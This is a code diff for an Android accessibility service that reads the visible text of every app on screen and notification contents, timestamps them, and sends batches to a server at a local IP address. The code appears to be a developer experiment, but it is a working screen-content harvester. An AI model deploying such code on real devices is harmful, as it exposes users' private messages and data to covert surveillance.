@@ -3,29 +3,34 @@ package com.example.demo;
 import android.accessibilityservice.AccessibilityService;
 import android.app.Notification;
 import android.os.AsyncTask;
-import android.os.Build;
 import android.os.Handler;
 import android.os.Looper;
 import android.os.Parcelable;
 import android.util.Log;
-import android.view.View;
 import android.view.accessibility.AccessibilityEvent;
 import android.view.accessibility.AccessibilityNodeInfo;
-
-import androidx.annotation.RequiresApi;
 
 import org.json.JSONArray;
 
 import java.io.OutputStreamWriter;
 import java.net.HttpURLConnection;
 import java.net.URL;
+import java.text.SimpleDateFormat;
+import java.util.ArrayList;
+import java.util.Collections;
+import java.util.Comparator;
+import java.util.Date;
 import java.util.HashSet;
+import java.util.List;
+import java.util.Locale;
 import java.util.Set;
 import java.util.concurrent.atomic.AtomicInteger;
 
 public class MyAccessibilityService extends AccessibilityService {
+
     private static final String TAG = "MyAccessibilityService";
-    private static final int BATCH_SIZE = 20;
+    private static final int BATCH_SIZE = 20; // Updated batch size to 20
+
     private final Set<String> loggedNodes = new HashSet<>();
     private final Set<String> tmpNodes = new HashSet<>();
     private final Set<String> loggedPackages = new HashSet<>();
@@ -38,7 +43,7 @@ public class MyAccessibilityService extends AccessibilityService {
         try {
             handleNodeInfo(getRootInActiveWindow(), 0, event.getPackageName().toString());
         } catch (Exception e) {
-            Log.e(TAG, "Error: " + e.getMessage(), e);
+            Log.e(TAG, "Error: " + e.getMessage() + " [" + System.currentTimeMillis() + "]", e);
         }
 
         if (eventType == AccessibilityEvent.TYPE_NOTIFICATION_STATE_CHANGED) {
@@ -49,15 +54,14 @@ public class MyAccessibilityService extends AccessibilityService {
         }
     }
 
-    private final Set<Integer> processedNodes = new HashSet<>();
-
-    private void handleNodeInfo(AccessibilityNodeInfo node, int depth, String packageName) {
+    public void handleNodeInfo(AccessibilityNodeInfo node, int depth, String packageName) {
         if (node == null) {
             return;
         }
 
-        if (loggedPackages.add(packageName)) {
-            Log.d(TAG, "\n" + packageName);
+        if (!loggedPackages.contains(packageName)) {
+            Log.d(TAG, packageName  );
+            loggedPackages.add(packageName);
         }
 
         StringBuilder indentation = new StringBuilder();
@@ -69,25 +73,19 @@ public class MyAccessibilityService extends AccessibilityService {
         CharSequence nodeContentDescription = node.getContentDescription();
         String className = getClassSimpleName(node.getClassName().toString());
 
-        if (nodeText != null && nodeText.equals(nodeContentDescription)) {
-            nodeContentDescription = null;
-        }
-
-        int nodeId = node.hashCode();  // Use node's hash code to identify it uniquely
-        if (processedNodes.contains(nodeId)) {
-            return;  // Skip already processed nodes
-        }
-        processedNodes.add(nodeId);
-
-        String sb = indentation + className + " " +
+        String nodeDescription = packageName + " " + className + " " +
                 (nodeText != null ? nodeText : "") + " " +
-                (nodeContentDescription != null ? nodeContentDescription : "") +
-                " " + System.currentTimeMillis();  // Use timestamp
+                (nodeContentDescription != null && !nodeContentDescription.equals(nodeText) ? nodeContentDescription : "");
 
-        if (loggedNodes.add(sb)) {
-            Log.d(TAG, sb);
-            tmpNodes.add("\n" + packageName);
-            tmpNodes.add(sb);
+        if ((!isEmpty(nodeText) || !isEmpty(nodeContentDescription)) && loggedNodes.add(nodeDescription)) {
+            String sb = indentation + className + " " +
+                    (nodeText != null ? nodeText : "") + " " +
+                    (nodeContentDescription != null ? nodeContentDescription : "") +
+                    " " + System.currentTimeMillis();
+
+            Log.d(TAG, sb.toString());
+
+            tmpNodes.add(sb.toString());
 
             if (tmpNodes.size() >= BATCH_SIZE) {
                 sendDatatoServer(new HashSet<>(tmpNodes));
@@ -100,18 +98,23 @@ public class MyAccessibilityService extends AccessibilityService {
         }
     }
 
+    private void sendDatatoServer(Set<String> dataSet) {
+        List<String> dataList = new ArrayList<>(dataSet);
+        new DataSenderTask().execute(dataList);
+    }
+
     private String getClassSimpleName(String className) {
-        int lastDotIndex = className.lastIndexOf('.');
-        return lastDotIndex != -1 ? className.substring(lastDotIndex + 1) : className;
+        String[] parts = className.split("\\.");
+        return parts.length > 0 ? parts[parts.length - 1] : className;
     }
 
-    private void sendDatatoServer(Set<String> data) {
-        new DataSenderTask().execute(data);
+    private boolean isEmpty(CharSequence str) {
+        return str == null || str.length() == 0;
     }
 
-    private static class DataSenderTask extends AsyncTask<Set<String>, Void, Void> {
+    private static class DataSenderTask extends AsyncTask<List<String>, Void, Void> {
         @Override
-        protected Void doInBackground(Set<String>... params) {
+        protected Void doInBackground(List<String>... params) {
             HttpURLConnection urlConnection = null;
             try {
                 URL url = new URL("http://192.168.1.10:5000");
@@ -120,9 +123,18 @@ public class MyAccessibilityService extends AccessibilityService {
                 urlConnection.setDoOutput(true);
                 urlConnection.setRequestProperty("Content-Type", "application/json");
 
-                JSONArray jsonArray = new JSONArray(params[0]);
+                List<String> dataList = params[0];
+                Collections.sort(dataList, new Comparator<String>() {
+                    @Override
+                    public int compare(String s1, String s2) {
+                        long timestamp1 = Long.parseLong(s1.substring(s1.lastIndexOf(" ") + 1));
+                        long timestamp2 = Long.parseLong(s2.substring(s2.lastIndexOf(" ") + 1));
+                        return Long.compare(timestamp1, timestamp2);
+                    }
+                });
 
-                // Log data before sending
+                JSONArray jsonArray = new JSONArray(dataList);
+
                 Log.d(TAG, "Sending data: " + jsonArray.toString());
 
                 try (OutputStreamWriter writer = new OutputStreamWriter(urlConnection.getOutputStream())) {
@@ -150,15 +162,22 @@ public class MyAccessibilityService extends AccessibilityService {
             Notification notification = (Notification) parcelable;
             CharSequence notificationTitle = notification.extras.getCharSequence(Notification.EXTRA_TITLE);
             CharSequence notificationText = notification.extras.getCharSequence(Notification.EXTRA_TEXT);
-            Log.d(TAG, "Package Name: " + event.getPackageName());
-            Log.d(TAG, "Notification Title: " + notificationTitle);
-            Log.d(TAG, "Notification Text: " + notificationText);
+            Log.d(TAG, "Package Name: " + event.getPackageName() );
+            Log.d(TAG, "Notification Title: " + notificationTitle  );
+            Log.d(TAG, "Notification Text: " + notificationText );
         } else {
-            for (CharSequence t : event.getText()) {
-                Log.d(TAG, "Notification Text: " + t);
+            List<CharSequence> notificationText = event.getText();
+            if (!notificationText.isEmpty()) {
+                for (CharSequence t : notificationText) {
+                    Log.d(TAG, "Notification Text: " + t.toString() );
+                }
+            } else {
+                Log.d(TAG, "Notification state changed but no text available. ");
             }
         }
     }
+
+
 
     @Override
     public void onInterrupt() {
